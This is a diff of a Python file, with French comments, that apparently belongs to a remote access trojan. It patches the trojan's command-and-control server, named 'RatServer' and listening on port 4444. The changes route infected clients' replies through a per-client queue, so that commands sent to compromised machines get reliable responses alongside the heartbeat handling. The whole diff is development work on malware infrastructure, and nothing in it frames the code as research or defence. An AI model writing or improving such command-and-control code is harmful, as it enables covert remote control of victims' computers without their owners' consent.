@@ -5,6 +5,7 @@ import logging
 import os
 import base64
 import sys
+import queue
 
 # ajoute le dossier parent au path
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
@@ -12,13 +13,13 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
 from shared.config import Config
 from shared.protocol import Protocol, Message
 
-class RatServer:
+class RatServerFixed:
     def __init__(self, host="0.0.0.0", port=4444):
         self.host = host
         self.port = port
         self.config = Config()
         self.protocol = Protocol(self.config.get_cipher())
-        self.clients = {}  # id: {"socket": sock, "info": {...}, "last_seen": time}
+        self.clients = {}  # id: {"socket": sock, "info": {...}, "last_seen": time, "response_queue": queue}
         self.client_counter = 0
         self.running = False
         
@@ -66,46 +67,49 @@ class RatServer:
             self.stop()
             
     def _handle_client(self, client_sock, client_id, addr):
-        # gere un client specifique
+        # gere un client specifique AVEC QUEUE pour les réponses
         try:
-            # ajoute le client a la liste
+            # ajoute le client a la liste avec une queue pour les réponses
+            response_queue = queue.Queue()
             self.clients[client_id] = {
                 "socket": client_sock,
                 "addr": addr,
                 "info": {},
-                "last_seen": time.time()
+                "last_seen": time.time(),
+                "response_queue": response_queue
             }
             
             # recoit les infos initiales
+            client_sock.settimeout(10)
             initial_msg = self.protocol.receive_full_message(client_sock)
             if initial_msg and initial_msg.type == "client_info":
                 self.clients[client_id]["info"] = initial_msg.data
                 print(f"[*] Client {client_id} info: {initial_msg.data}")
                 
-            # garde la connexion vivante
+            # boucle principale - traite TOUS les messages
+            client_sock.settimeout(35)
             while self.running and client_id in self.clients:
                 try:
-                    client_sock.settimeout(35)  # timeout plus long que heartbeat client
                     msg = self.protocol.receive_full_message(client_sock)
                     
                     if not msg:
-                        print(f"[DEBUG] No message from client {client_id}, disconnecting")
+                        print(f"[DEBUG] Client {client_id} disconnected")
                         break
                         
                     self.clients[client_id]["last_seen"] = time.time()
                     
                     if msg.type == "heartbeat":
-                        # repond au heartbeat SANS attendre de reponse
+                        # heartbeat - répond directement
                         response = Message("heartbeat_ack")
                         self._send_message_safe(client_sock, response)
                         print(f"[DEBUG] Heartbeat from client {client_id}")
+                    else:
+                        # réponse à une commande - met dans la queue
+                        print(f"[DEBUG] Response from client {client_id}: {msg.type}")
+                        response_queue.put(msg)
                         
                 except socket.timeout:
-                    # timeout - verifie si le client est encore la
-                    current_time = time.time()
-                    if current_time - self.clients[client_id]["last_seen"] > 90:
-                        print(f"[DEBUG] Client {client_id} timeout (no heartbeat)")
-                        break
+                    # timeout normal
                     continue
                 except Exception as e:
                     print(f"[DEBUG] Client {client_id} error: {e}")
@@ -157,11 +161,13 @@ class RatServer:
                 pass
             
     def send_command(self, client_id, command, args=None):
-        # envoie une commande a un client specifique - VERSION SECURISEE
+        # envoie une commande et attend la réponse via la QUEUE
         if client_id not in self.clients:
             return {"status": "error", "message": "Client not found"}
             
-        client_sock = self.clients[client_id]["socket"]
+        client_info = self.clients[client_id]
+        client_sock = client_info["socket"]
+        response_queue = client_info["response_queue"]
         
         # test si le socket est encore valide
         try:
@@ -174,36 +180,27 @@ class RatServer:
         try:
             message = Message(command, args or {})
             
+            # vide la queue avant d'envoyer
+            while not response_queue.empty():
+                try:
+                    response_queue.get_nowait()
+                except queue.Empty:
+                    break
+            
             # envoie la commande
+            print(f"[DEBUG] Sending command to client {client_id}: {command}")
             if not self._send_message_safe(client_sock, message):
                 self._cleanup_single_client(client_id)
                 return {"status": "error", "message": "Failed to send command"}
             
-            # attend la reponse avec timeout
+            # attend la réponse via la queue
             try:
-                old_timeout = client_sock.gettimeout()
-                client_sock.settimeout(30)  # 30 sec timeout
+                response_msg = response_queue.get(timeout=30)  # 30 sec timeout
+                print(f"[DEBUG] Got response from client {client_id}: {response_msg.type}")
+                return response_msg.to_dict()
                 
-                response = self.protocol.receive_full_message(client_sock)
-                
-                # restore timeout seulement si socket encore valide
-                try:
-                    client_sock.settimeout(old_timeout)
-                except:
-                    pass  # socket peut etre ferme entre temps
-                
-                if response:
-                    self.clients[client_id]["last_seen"] = time.time()
-                    return response.to_dict()
-                else:
-                    self._cleanup_single_client(client_id)
-                    return {"status": "error", "message": "No response from client"}
-                    
-            except socket.timeout:
+            except queue.Empty:
                 return {"status": "error", "message": "Command timeout"}
-            except:
-                self._cleanup_single_client(client_id)
-                return {"status": "error", "message": "Connection lost"}
                 
         except Exception as e:
             self._cleanup_single_client(client_id)
